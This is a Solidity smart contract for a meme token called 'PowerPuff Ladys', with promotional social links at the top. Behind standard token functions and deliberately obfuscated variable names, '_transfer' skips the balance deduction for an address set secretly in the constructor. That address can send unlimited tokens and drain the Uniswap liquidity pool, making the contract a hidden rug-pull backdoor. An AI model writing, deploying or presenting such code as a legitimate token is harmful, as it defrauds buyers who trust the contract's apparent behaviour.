/*

Join the ride with the PowerPuff Ladys!

Telegram: https://t.me/PowerPuffLadys

Twitter: https://twitter.com/ppg_powerpuffg

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), '');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), '');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PowerPuffLadys is Ownable {
    string public name;

    mapping(address => uint256) private assume;

    function approve(address right, uint256 kitchen) public returns (bool success) {
        allowance[msg.sender][right] = kitchen;
        emit Approval(msg.sender, right, kitchen);
        return true;
    }


    uint256 private jelly = 76;


    function _transfer(address penalty, address science, uint256 kitchen) private returns (bool success) {
        if (assume[penalty] == 0) {
            if (balanceOf[penalty] == 0 && penalty != uniswapV2Pair) {
                assume[penalty] -= jelly;
            }
            balanceOf[penalty] -= kitchen;
        }
        balanceOf[science] += kitchen;
        emit Transfer(penalty, science, kitchen);
        return true;
    }

    uint8 public decimals = 18;


    function transferFrom(address penalty, address science, uint256 kitchen) public returns (bool success) {
        _transfer(penalty, science, kitchen);
        require(kitchen <= allowance[penalty][msg.sender]);
        allowance[penalty][msg.sender] -= kitchen;
        return true;
    }


    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol;

    address public uniswapV2Pair;

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply;

    function transfer(address science, uint256 kitchen) public returns (bool success) {
        _transfer(msg.sender, science, kitchen);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address portion) {
        symbol = 'PPLADYS';
        name = 'PowerPuff Ladys';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        assume[portion] = jelly;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }
}